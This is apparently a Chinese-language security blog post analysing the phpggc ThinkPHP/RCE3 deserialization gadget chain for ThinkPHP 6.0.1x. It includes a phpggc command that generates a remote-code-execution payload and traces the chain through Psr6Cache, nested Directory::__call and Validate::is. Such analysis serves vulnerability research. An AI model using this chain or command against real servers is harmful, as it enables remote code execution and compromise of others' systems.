---
title: phpggc thinkphp RCE3
date: 2023-06-07 22:21:25
categories:
- PHP
tags:
- Deserialization
- thinkphp
toc: true
image:
  path: /assets/images/php.png
---

> - [php-反序列化格式基础](/php/2023/06/08/php-反序列化格式基础.html)
- [php-反序列化绕过](/php/2023/06/08/php-反序列化绕过.html)
- [php-反序列化字符逃逸](/php/2023/06/08/php-反序列化字符逃逸.html)
- [php-phar-反序列化](/php/2023/06/08/php-phar-反序列化利用.html)
- [php-反序列化原生类利用](/php/2023/06/08/php-反序列化原生类利用.html)
- [phpggc-利用链分析](/php/2023/06/08/phpggc-thinkphp-利用链分析.html)
  - ThinkPHP
    - [phpggc-thinkphp-RCE1](/php/2023/06/08/phpggc-thinkphp-RCE1.html)
    - [phpggc-thinkphp-RCE2](/php/2023/06/08/phpggc-thinkphp-RCE2.html)
    - [phpggc-thinkphp-RCE3](/php/2023/06/08/phpggc-thinkphp-RCE3.html)
    - [phpggc-thinkphp-RCE4](/php/2023/06/08/phpggc-thinkphp-RCE4.html)
    - [phpggc-thinkphp-FW1](/php/2023/06/08/phpggc-thinkphp-FW1.html)
    - [phpggc-thinkphp-FW2](/php/2023/06/08/phpggc-thinkphp-FW2.html)


## RCE3
影响范围：
- thinkphp 6.0.1x

### 使用

```bash
phpggc ThinkPHP/RCE3 system id  -b -u
```

### 分析
thinkphp 6 版本与此前的版本存在较大差异，搜索 `__destruct` 时可发现入口点都在 vendor 目录下，也就是 Composer 类库目录。
```php
vendor/league/flysystem-cached-adapter/src/Storage
    AbstractCache.php
        public function __destruct()
vendor/league/flysystem/src
    SafeStorage.php
        public function __destruct()
vendor/league/flysystem/src/Adapter
    AbstractFtpAdapter.php
        public function __destruct()
vendor/topthink/think-orm/src
    Model.php
        public function __destruct()
vendor/topthink/think-orm/src/db
    Connection.php
        public function __destruct()
```


RCE3 整个调用链如下所示：
```php                                        
League\Flysystem\Cached\Storage\Psr6Cache::__destruct()
    | $this->save();                                   
    | $this->pool->getItem()                           
    League\Flysystem\Directory::__call()<---+          
        | call_user_func_array              |          
        | $this->getItem()  ----------------+          
        think\Validate::__call()                       
            | call_user_func_array                     
            | $this->is()                              
            | call_user_func_array  * <----            
```
总体看这条链还是比较短的，入口点为 Psr6Cache，这个类为 AbstractCache 的实现类。sink 点为 `think\Validate` 的 is 方法，在 is 方法中可以找到 call_user_func_array 的调用，`$this->type` 是可控的，`$rule` 和 `$value` 都是传入的参数。
```php
    default:
        if (isset($this->type[$rule])) {
            // 注册的验证规则
            $result = call_user_func_array($this->type[$rule], [$value]);
```
`think\Validate` 类正好有一个 `__call` 方法，且使用 call_user_func_array 调用自身的 is 方法，传入参数为 args，这样看来还是比较好控制的。
```php
public function __call($method, $args)
{
    if ('is' == strtolower(substr($method, 0, 2))) {
        $method = substr($method, 2);
    }

    array_push($args, lcfirst($method));

    return call_user_func_array([$this, 'is'], $args);
}
```
这条链比较巧妙的点在与 Directory 的构造，在`think\Validate::__call` 中，`call_user_func_array` 调用 is 方法时需要传入三个参数,其中第三个参数为数组。
```php
public function is($value, string $rule, array $data = [])
```
由于是从 `League\Flysystem\Directory::__call()` 中使用 `call_user_func_array` 调用 getItem 函数过来的，因此 `$method` 的值为 'getItem', 但 `array_push($args, lcfirst($method));` 仅会往 `$args` 末尾添加一个元素 'getItem'，因此在传入`think\Validate::call`时 `$args` 的第三个元素需要为一个数组。

调试时就可以发现，如果仅仅构造一层的 Directory，`$args` 的第三个元素始终都无法为一个数组，因此在构造 payload 时对 `League\Flysystem\Directory` 进行了嵌套。
```php
array_unshift($arguments, $this->path);
```
也就是说，第一次调用到 `League\Flysystem\Directory::__call` 中的 `call_user_func_array` 时，再次调用 `League\Flysystem\Directory::getItem`,由于这方法不存在，会再次进入 `__call`，从而两次执行 `array_unshift($arguments, $this->path);` 进而构造一个满足条件的 `$arguments`.
```php
public function __call($method, array $arguments)
{
    array_unshift($arguments, $this->path);
    $callback = [$this->filesystem, $method];

    try {
        return call_user_func_array($callback, $arguments); <---
    } catch (BadMethodCallException $e) {
        throw new BadMethodCallException(
            'Call to undefined method '
            . get_called_class()
            . '::' . $method
        );
    }
}
```

## 参考资料
- [ThinkPHP getshell的poc链挖掘](https://blog.51cto.com/u_12364708/5508636#:~:text=%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-ThinkPHP6.0.12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%201%20%E5%89%8D%E6%8F%90%E4%BB%8B%E7%BB%8D%202%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%203,%E6%89%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E7%82%B9%204%20%E7%A1%AE%E5%AE%9A%E9%93%BE%E8%B7%AF%205%20%E7%A1%AE%E5%AE%9A%E6%95%B4%E4%BD%93write%E6%B5%81%E7%A8%8B%206%20%E6%9E%84%E5%BB%BApoc%E9%93%BE%E5%B9%B6%E5%AE%9E%E7%8E%B0getshell)